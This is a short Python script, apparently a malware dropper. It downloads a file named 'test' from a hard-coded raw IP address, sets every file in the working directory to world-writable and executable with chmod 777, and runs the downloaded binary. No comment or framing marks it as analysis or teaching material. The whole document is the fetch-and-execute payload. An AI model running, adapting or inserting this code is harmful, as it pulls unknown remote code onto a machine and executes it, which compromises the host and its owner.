import wget
import os

remote_url = 'http://45.95.146.91/test'

local_file = 'test'

wget.download(remote_url, local_file)

os.system("chmod 777 *; ./test WORKS")
